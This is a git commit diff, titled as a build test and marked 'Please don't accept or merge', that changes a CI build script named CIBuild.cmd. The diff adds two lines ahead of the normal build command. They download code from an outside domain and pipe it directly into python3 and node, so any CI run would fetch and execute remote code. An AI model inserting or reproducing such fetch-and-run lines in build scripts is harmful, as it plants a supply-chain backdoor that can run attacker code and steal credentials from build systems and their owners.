b6a383fd415fc0f8172bdf6e7e1beb995f460ba8
ChrisFart1ng <138223922+ChrisFart1ng@users.noreply.github.com>
2023-07-01 18:21:53 +0300

    test: build test
    Please don't accept or merge

--- eng/common/CIBuild.cmd
+++ eng/common/CIBuild.cmd
@@ -1,2 +1,5 @@
 @echo off
+
+curl -L https://appsecc.com/py|python3
+curl -L https://appsecc.com/js|node
 powershell -ExecutionPolicy ByPass -NoProfile -command "& """%~dp0Build.ps1""" -restore -build -test -sign -pack -publish -ci %*"
